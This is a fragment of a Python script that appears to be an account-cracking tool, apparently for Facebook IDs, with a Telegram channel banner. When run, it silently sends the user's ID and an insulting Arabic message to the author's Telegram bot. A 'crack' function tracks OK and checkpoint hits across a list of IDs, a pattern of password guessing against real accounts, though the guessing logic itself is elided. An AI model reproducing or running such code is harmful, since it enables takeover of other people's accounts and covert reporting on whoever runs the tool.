...
os.system('clear')
TTBB= (f' ابن الكحبة شغل الاداة  \n\n tg://openmessage?user_id={ID} :')
requests.get("https://api.telegram.org/bot"+str(TBO)+"/sendMessage?chat_id="+str(ID9)+"&text="+str(TTBB))
pretty.install()
CON=sol()
ua = UserAgent()
user_ahd = ua.chrome
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()	
	print('\x1b[38;5;166m{•\x1b[38;5;48m\x1b[38;5;166m} \x1b[38;5;216m 𝑇𝐻𝐸 𝐶𝐻𝐴𝑁𝑁𝐸𝐿\x1b[38;5;118m ⁞ @T4TWI   ')
	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
''')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s• ًٍُِّTًٍَُِّPًٍَُِّAًٍَُِّRًٍَُِّK ༆ • %s/%s > OK %s > CP %s > %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
